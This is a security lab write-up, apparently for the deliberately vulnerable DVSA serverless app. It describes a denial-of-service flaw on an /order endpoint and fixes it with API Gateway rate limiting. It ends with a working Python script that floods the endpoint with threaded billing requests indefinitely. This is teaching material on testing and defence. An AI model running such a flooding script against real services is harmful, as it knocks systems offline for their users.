## Lesson 6: Denial of Service (DoS) — Fix

### Vulnerability
The /order POST endpoint in API Gateway had no rate limiting configured. The DVSA-PAYMENT-PROCESSER Lambda function shared only 10 unreserved concurrency slots with the entire AWS account and had no reserved concurrency of its own. An attacker sending more than 10 concurrent billing requests could exhaust all available slots.

### Configuration Change

| Setting | Before Fix | After Fix |
|---------|-----------|-----------|
| Rate  | 10,000 (stage default) | 5 |
| Burst  | 5,000 (stage default) | 2 |



### Verification

**Before fix:**
```bash
# Output: stream of 500/502 Internal Server Error
# user gets: {"message": "Internal server error"}
```

**After fix:**
```bash
# Output: 429 Too Many Requests
# user can still create orders successfully
```

### DoS Attack Script
```python
import threading, requests, os, time

API      = "YOUR_API_ENDPOINT"
TOKEN    = "YOUR_JWT_TOKEN"
ORDER_ID = "YOUR_ORDER_ID"

url = API
headers = {"Content-Type": "application/json", "Authorization": TOKEN}
payload = ('{"action":"billing","order-id":"' + ORDER_ID + '",'
    '"data":{"ccn":"4242424242424242","exp":"11/26","cvv":"444"}}')

def dos():
    try:
        r = requests.post(url, data=payload, headers=headers, timeout=15)
        print(r.status_code, r.text[:120])
    except Exception as e:
        print('Error:', e)

print('Starting DoS attack -- press Ctrl+C to stop...')
while True:
    threading.Thread(target=dos, daemon=True).start()
    time.sleep(0.05)
```
